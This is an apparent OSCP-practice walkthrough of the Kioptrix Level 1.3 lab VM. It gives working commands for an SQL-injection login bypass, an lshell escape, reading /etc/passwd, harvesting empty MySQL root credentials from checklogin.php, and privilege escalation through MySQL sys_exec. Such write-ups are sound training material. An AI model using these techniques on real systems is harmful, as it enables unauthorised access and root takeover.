# OSCP Vulnhub Set 1 - Kioptrix: Level 1.3 (#4)

lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=f203afd5-8c42-4834-984f-c353345e231e

target ip: `10.101.85.14`

---

## Scanning and Enumeration

### nmap

port scanning.

```
nmap -p- 10.101.85.14
```

port 22, 80, 139 and 445 are opened.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/04]
└─$ nmap -p- 10.101.85.14
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 23:08 -0400
Nmap scan report for 10.101.85.14
Host is up (0.0031s latency).
Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 42.41 seconds
```

view the target site.

```
http://10.101.85.14
```

it's login page, that's interesting.

![](./images/01.png)

i want to explore this site, let's find other directories.

---

### gobuster

use this command.

```
gobuster dir -u http://10.101.85.14 -w /usr/share/wordlists/dirb/common.txt
```

it's found many interesthing directories, let's explore it.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/04]
└─$ gobuster dir -u http://10.101.85.14 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.101.85.14
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 328]
.htaccess            (Status: 403) [Size: 328]
.hta                 (Status: 403) [Size: 323]
cgi-bin/             (Status: 403) [Size: 327]
images               (Status: 301) [Size: 352] [--> http://10.101.85.14/images/]
index                (Status: 200) [Size: 1255]
index.php            (Status: 200) [Size: 1255]
john                 (Status: 301) [Size: 350] [--> http://10.101.85.14/john/]
logout               (Status: 302) [Size: 0] [--> index.php]
member               (Status: 302) [Size: 220] [--> index.php]
server-status        (Status: 403) [Size: 332]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

after searching for a while, i haven't found any useful information, except for the name `john`, who seems to be the user.

---

## Exploitation

### sql injection

i try to login as `john`, and after trying for a while, i succeeded by using this bypass payload.

```
' or '1'='1
```

after logging in, i found another password.

![](./images/02.png)

from the `nmap` results, i know the `ssh` port is open.

---

### ssh

let's try logging in.

```
ssh john@10.101.85.14
```

it's fail, i need to use `ssh-rsa` or `ssh-dss`.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/04]
└─$ ssh john@10.101.85.14
Unable to negotiate with 10.101.85.14 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

force `ssh` to use `ssh-rsa`, then try again.

```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa john@10.101.85.14
MyNameIsJohn
```

now, i'm in.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/04]
└─$ ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa john@10.101.85.14
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
john@10.101.85.14's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$
```

show the list of allowed commands that i can use.

```
?
```

notthing much.

```
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

after exploring and gathering information for a while, i think this is `lshell`, which based on `python`.

```
john:~$ id
*** unknown command: id
john:~$ whoami
*** unknown command: whoami
john:~$ echo $SHELL
*** forbidden path -> "/bin/kshell"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
```

i looked for more information about it and found this site.

```
https://www.aldeid.com/wiki/Lshell
```

based on the content from that site, there is a command that can bypass `lshell`, let's use it.

```
echo os.system('/bin/bash')
```

it's work, i can use other command now.

```
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
```

let's find the way to privilege escalation.

---

## Privilege Escalation

### credential

find other user.

```
cat /etc/passwd
```

there are three users in this machine.

```
john@Kioptrix4:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/kshell
robert:x:1002:1002:,,,:/home/robert:/bin/kshell
```

show the process that run as root.

```
ps aux | grep root
```

i found `mysql` that's run as root, that's interesting.

```
john@Kioptrix4:~$ ps aux | grep root
root         1  0.0  0.0   2844  1692 ?        Ss   May06   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   May06   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   May06   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S<   May06   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   May06   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   May06   0:00 [migration/1]
root         7  0.0  0.0      0     0 ?        S<   May06   0:00 [ksoftirqd/1]
root         8  0.0  0.0      0     0 ?        S<   May06   0:00 [watchdog/1]
root         9  0.0  0.0      0     0 ?        S<   May06   0:04 [events/0]
root        10  0.0  0.0      0     0 ?        S<   May06   0:04 [events/1]
root        11  0.0  0.0      0     0 ?        S<   May06   0:00 [khelper]
root        46  0.0  0.0      0     0 ?        S<   May06   0:00 [kblockd/0]
root        47  0.0  0.0      0     0 ?        S<   May06   0:00 [kblockd/1]
root        50  0.0  0.0      0     0 ?        S<   May06   0:00 [kacpid]
root        51  0.0  0.0      0     0 ?        S<   May06   0:00 [kacpi_notify]
root       178  0.0  0.0      0     0 ?        S<   May06   0:00 [kseriod]
root       222  0.0  0.0      0     0 ?        S    May06   0:00 [pdflush]
root       223  0.0  0.0      0     0 ?        S    May06   0:04 [pdflush]
root       224  0.0  0.0      0     0 ?        S<   May06   0:00 [kswapd0]
root       266  0.0  0.0      0     0 ?        S<   May06   0:00 [aio/0]
root       267  0.0  0.0      0     0 ?        S<   May06   0:00 [aio/1]
root      1469  0.0  0.0      0     0 ?        S<   May06   0:00 [ata/0]
root      1470  0.0  0.0      0     0 ?        S<   May06   0:00 [ata/1]
root      1471  0.0  0.0      0     0 ?        S<   May06   0:00 [ata_aux]
root      1478  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_0]
root      1479  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_1]
root      1560  0.0  0.0      0     0 ?        S<   May06   0:00 [ksuspend_usbd]
root      1565  0.0  0.0      0     0 ?        S<   May06   0:00 [khubd]
root      2396  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_2]
root      2498  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_3]
root      2499  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_4]
root      2500  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_5]
root      2501  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_6]
root      2502  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_7]
root      2503  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_8]
root      2504  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_9]
root      2505  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_10]
root      2506  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_11]
root      2507  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_12]
root      2508  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_13]
root      2509  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_14]
root      2510  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_15]
root      2511  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_16]
root      2512  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_17]
root      2513  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_18]
root      2514  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_19]
root      2515  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_20]
root      2516  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_21]
root      2517  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_22]
root      2518  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_23]
root      2519  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_24]
root      2520  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_25]
root      2521  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_26]
root      2522  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_27]
root      2523  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_28]
root      2524  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_29]
root      2525  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_30]
root      2526  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_31]
root      2527  0.0  0.0      0     0 ?        S<   May06   0:00 [scsi_eh_32]
root      2690  0.0  0.0      0     0 ?        S<   May06   0:01 [kjournald]
root      2861  0.0  0.0   2224   672 ?        S<s  May06   0:00 /sbin/udevd --daemon
root      3474  0.0  0.0      0     0 ?        S<   May06   0:00 [kpsmoused]
root      4581  0.0  0.0   1716   488 tty4     Ss+  May06   0:00 /sbin/getty 38400 tty4
root      4582  0.0  0.0   1716   488 tty5     Ss+  May06   0:00 /sbin/getty 38400 tty5
root      4586  0.0  0.0   1716   492 tty2     Ss+  May06   0:00 /sbin/getty 38400 tty2
root      4587  0.0  0.0   1716   492 tty3     Ss+  May06   0:00 /sbin/getty 38400 tty3
root      4593  0.0  0.0   1716   488 tty6     Ss+  May06   0:00 /sbin/getty 38400 tty6
root      4649  0.0  0.0   1872   540 ?        S    May06   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
root      4670  0.0  0.0   5316   984 ?        Ss   May06   0:00 /usr/sbin/sshd
root      4726  0.0  0.0   1772   528 ?        S    May06   0:00 /bin/sh /usr/bin/mysqld_safe
root      4768  0.0  0.7 126988 16380 ?        Sl   May06   2:42 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/
root      4770  0.0  0.0   1700   556 ?        S    May06   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
root      4843  0.0  0.0   6532  1384 ?        Ss   May06   0:08 /usr/sbin/nmbd -D
root      4845  0.0  0.1  10108  2720 ?        Ss   May06   0:00 /usr/sbin/smbd -D
root      4859  0.0  0.0  10108  1028 ?        S    May06   0:00 /usr/sbin/smbd -D
root      4860  0.0  0.0   8084  1572 ?        Ss   May06   0:01 /usr/sbin/winbindd
root      4874  0.0  0.0   8084  1060 ?        S    May06   0:00 /usr/sbin/winbindd
root      4892  0.0  0.0   2104   888 ?        Ss   May06   0:00 /usr/sbin/cron
root      4914  0.0  0.3  20464  6772 ?        Ss   May06   0:22 /usr/sbin/apache2 -k start
root      4970  0.0  0.0   1716   492 tty1     Ss+  May06   0:00 /sbin/getty 38400 tty1
root     14482  0.0  0.1  11360  3720 ?        Ss   01:11   0:00 sshd: john [priv]
john     14569  0.0  0.0   3008   772 pts/0    R+   01:44   0:00 grep root
```

### mysql

after searching for other information for a while, i found `checklogin.php` located in `/var/www`, which contains `mysql` credentials.

```
john@Kioptrix4:/var/www$ cat checklogin.php 
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect");
mysql_select_db("$db_name")or die("cannot select DB");

// Define $myusername and $mypassword
$myusername=$_POST['myusername'];
$mypassword=$_POST['mypassword'];

// To protect MySQL injection (more detail about MySQL injection)
$myusername = stripslashes($myusername);
//$mypassword = stripslashes($mypassword);
$myusername = mysql_real_escape_string($myusername);
//$mypassword = mysql_real_escape_string($mypassword);

//$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query("SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'");
//$result=mysql_query($sql);

// Mysql_num_row is counting table row
$count=mysql_num_rows($result);
// If result matched $myusername and $mypassword, table row must be 1 row

if($count!=0){
// Register $myusername, $mypassword and redirect to file "login_success.php"
        session_register("myusername");
        session_register("mypassword");
        header("location:login_success.php?username=$myusername");
}
else {
echo "Wrong Username or Password";
print('<form method="link" action="index.php"><input type=submit value="Try Again"></form>');
}

ob_end_flush();
?>
```

let's login to `mysql` as `root`.

```
mysql -u "root"
```

success.

```
john@Kioptrix4:~$ mysql -u "root"
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 56
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> 
```

modify the current user `john`, to be run any sudo command.

```
use mysql;
select sys_exec('usermod -a -G admin john');
exit
```

success.

```
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.01 sec)

mysql> exit
Bye
```

change to root.

```
sudo su -
MyNameIsJohn
```

now, i'm root.

```
john@Kioptrix4:~$ sudo su -
[sudo] password for john: 
root@Kioptrix4:~#
```